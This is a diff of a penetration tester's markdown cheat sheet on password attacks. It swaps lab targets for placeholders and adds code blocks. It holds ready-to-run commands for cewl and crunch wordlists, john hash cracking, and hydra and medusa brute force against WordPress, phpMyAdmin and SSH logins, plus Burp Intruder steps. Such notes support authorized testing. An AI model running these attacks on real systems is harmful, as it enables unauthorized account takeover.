@@ -2536,20 +2536,38 @@ ls -lh /usr/share/nmap/scripts/*shellshock*
 
 If you come across a hard to enumerate host This is your go to technique find all logins and list them here and start bruteforceing
 
+```
+list login services and links here
+
+some examples are
+ftp login: *ftp-login*
+http login: *http-login*
+smb login: *smb-login*
+ssh login: *ssh-login*
+
+you must try to brute force each one individually
+
+```
+
 REF: to the bruteforce tab in the web pentesters workbook. 
 
 ### Cewl
+
 create a password list with cewl
 
-cewl www.megacorpone.com -m 6 -w  /root/mega-cewl.txt 2>/dev/null
+```
+cewl *target-domain* -m 6 -w  /root/mega-cewl.txt 2>/dev/null
+```
 once the password list is ready then you can create more passwords, pass it on to john the ripper for some password mangling
 
+```
 john --wordlist=mega-cewl.txt --rules --stdout > mega-mangled
+```
 
 ### brute force http
-
-medusa -h admin.megacorpone.com -u admin -P mega-mangled -M http -n 81 -m DIR:/admin -T 30
-
+```
+medusa -h *target-domain* -u admin -P mega-mangled -M http -n 81 -m DIR:/admin -T 30
+```
 ### COMMON USER PASSWORD PROFILER (CUPP)
 
 *important* if you get usernames create wordlists based on that with cup.py
@@ -2571,12 +2589,13 @@ This tool is greate for generating passwords from information found about users 
 	
 #### John format examples
 
+```
 john --format=des      username:SDbsugeBiC58A
 john --format=lm       username: $LM$a9c604d244c4e99d
 john --format=md5      $1$12345678$aIccj83HRDBo6ux1bVx7D1
 
 look in red team field manual for more formats
-
+```
 ### Generate a wordlist based off single word
 
 #### Add lower(@), upper(,), number(%), and symbol(^) to the end of the word
@@ -2618,11 +2637,14 @@ crunch 10 10 -t @@@@@@0728 -o /root/birthdaywordlist.lst
 ### hydra
 
 ```
-hydra -l admin -P /root/Desktop/wordlists/500-worst-passwords.txt 10.194.0.36 http-get-form "/geeklog/users.php:login=^USER^&PASS^:Deny"
+hydra -l admin -P /root/Desktop/wordlists/500-worst-passwords.txt *target* http-get-form "/geeklog/users.php:login=^USER^&PASS^:Deny"
+
+hydra -l admin -P /root/Desktop/wordlists/rock-you.txt *target* http-get-form "/geeklog/users.php:login=^USER^&PASS^:Deny"
 
 hydra -l elliot -P ~/fsocity.dic *target* http-post-form “/wp-login.php:log=elliot&pwd=^PASS^:ERROR”
 
-hydra -l admin -P passwords.lst -e ns -vV 192.168.2.10 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
+hydra -l admin -P passwords.lst -e ns -vV *target* http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
+
 ```
 ### SSH Bruteforce
 
@@ -2646,6 +2668,7 @@ medusa -u root -P 500-worst-passwords.txt -h *target* -M ssh
 
 ### burp suite brute force for HTTP logins
 
+```
 1. set proxy settings
 
 2. intercept login
@@ -2663,7 +2686,7 @@ medusa -u root -P 500-worst-passwords.txt -h *target* -M ssh
 8. forward request and turn off intercept
 
 9. click intruder > positions > remove or add dollar signs > select cluster bomb from top > click payloads > set payloads 1 & 2
-
+```
 
 ### ncrack RDP
 
